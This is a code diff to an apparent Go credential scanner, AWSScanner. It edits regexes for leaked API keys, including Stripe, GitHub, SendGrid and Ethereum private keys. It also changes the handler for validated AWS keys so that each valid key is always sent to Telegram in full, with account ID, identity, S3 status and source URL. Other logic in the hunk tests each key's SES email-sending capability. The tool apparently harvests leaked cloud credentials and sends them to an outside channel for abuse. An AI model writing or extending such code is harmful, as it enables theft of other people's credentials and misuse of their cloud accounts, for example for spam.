@@ -570,9 +570,9 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		SendGridAPIKeyPatternInfo:    regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`),
 		MailgunAPIKeyPatternInfo:     regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
 		GitHubAccessTokenPatternInfo: regexp.MustCompile(`(gh[oprus]_[A-Za-z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})`),
-		// Stripe key formats: secret (sk_*), publishable (pk_*), restricted (rk_*) — live and test variants.
-		// Restricted-key variants rk_live_ and rk_test_ explicitly enumerated to keep coverage visible.
-		StripePattern:                regexp.MustCompile(`(sk_live_|sk_test_|pk_live_|pk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{16,99}`),
+		// Stripe key formats: secret (sk_*) and restricted (rk_*) only.
+		// Publishable keys (pk_live_/pk_test_) are intentionally public — excluded to avoid noise.
+		StripePattern:                regexp.MustCompile(`(sk_live_|sk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{16,99}`),
 		// ETH/EVM private key: 64 hex chars, often prefixed 0x. Match labeled occurrences only
 		// to keep false positives down (any 64-hex string would otherwise match git SHAs, etc.).
 		ETHPrivateKeyPattern: regexp.MustCompile(`(?i)(?:PRIVATE[_-]?KEY|ETH[_-]?PRIVATE[_-]?KEY|WALLET[_-]?PRIVATE[_-]?KEY|PRIVKEY)\s*[:=]\s*["']?(0x[a-fA-F0-9]{64}|[a-fA-F0-9]{64})["']?`),
@@ -4920,17 +4920,19 @@ func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.
 
 	a.saveIntoFile(fmt.Sprintf("AWS %s SES: %+v SNS: %+v Fargate: %+v IAM Audit: %s", keyLine, sesInfo, snsInfo, fargateInfo, iamAuditResult), "aws_deep_scan.txt")
 
-	// Hanya kirim telegram jika:
-	// 1. Ada limit SES/SNS/Fargate yang terdeteksi DAN
-	// 2. Bisa mengirim email via SDK
 	hasLimits := len(sesInfo) > 0 || len(snsInfo) > 0 || len(fargateInfo) > 0
 	emailSuccess := emailResult["success"].(bool)
 
 	if hasLimits && emailSuccess {
+		// Full notification: SES-capable account that can send email
 		go a.sendTelegram(msg)
-		pterm.Success.Printfln("[AWS NOTIF] Telegram sent for %s (Has Limits + Email Success)", ak[:8]+"...")
+		pterm.Success.Printfln("[AWS NOTIF] Full Telegram for %s (SES + Email)", ak[:8]+"...")
 	} else {
-		pterm.Warning.Printfln("[AWS SKIP] No Telegram for %s | Limits: %v | Email: %v", ak[:8]+"...", hasLimits, emailSuccess)
+		// Always notify for valid AWS key regardless of email capability
+		simpleMsg := fmt.Sprintf("☁️ <b>VALID AWS KEY</b>\n\n👤 <b>Identity:</b> <code>%s</code>\n🆔 <b>Account:</b> <code>%s</code>\n🔑 <b>Key:</b> <code>%s</code>\n📦 <b>S3:</b> %s\n🔗 <b>Source:</b> %s\n\n⚠️ No SES/email capability detected",
+			userOrRole, *identity.Account, ak, s3Status, sourceURL)
+		go a.sendTelegram(simpleMsg)
+		pterm.Warning.Printfln("[AWS NOTIF] Simplified Telegram for %s | Limits: %v | Email: %v", ak[:8]+"...", hasLimits, emailSuccess)
 	}
 }
 
